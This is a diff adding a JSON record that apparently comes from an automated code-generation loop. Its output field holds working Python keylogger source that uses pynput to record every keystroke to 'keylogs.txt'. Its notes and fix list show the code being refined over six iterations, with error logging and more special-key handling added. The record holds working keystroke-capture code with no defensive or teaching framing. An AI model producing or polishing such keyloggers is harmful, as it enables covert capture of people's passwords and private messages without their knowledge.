@@ -1,0 +1,9 @@
+{
+  "output": "import pynput\nfrom pynput.keyboard import Key, Listener, KeyCode\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if key == Key.space:\n                f.write('[SPACE] ')\n            elif key == Key.enter:\n                f.write('[ENTER]\\n')\n            elif key == Key.shift_l or key == Key.shift_r:\n                f.write('[SHIFT] ')\n            elif key == Key.ctrl_l or key == Key.ctrl_r:\n                f.write('[CTRL] ')\n            elif key == Key.alt_l or key == Key.alt_r:\n                f.write('[ALT] ')\n            elif key == Key.backspace:\n                f.write('[BACKSPACE] ')\n            elif key == Key.tab:\n                f.write('[TAB] ')\n            elif key == Key.caps_lock:\n                f.write('[CAPS_LOCK] ')\n            elif key == Key.esc:\n                return False\n            else:\n                f.write(str(key.char))\n    except AttributeError:\n        pass\n    except Exception as e:\n        with open('error_log.txt', 'a') as error_file:\n            error_file.write(f'Error: {e}\\n')\ndef main():\n    try:\n        with Listener(on_press=on_press) as listener:\n            listener.join()\n    except Exception as e:\n        with open('error_log.txt', 'a') as error_file:\n            error_file.write(f'Unexpected Error: {e}\\n')\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Added logging to 'error_log.txt' for exceptions and handled additional special keys in on_press function.",
+  "applied_fixes": [
+    "iteration5_issue1",
+    "iteration5_issue2"
+  ],
+  "iterations": 6
+}
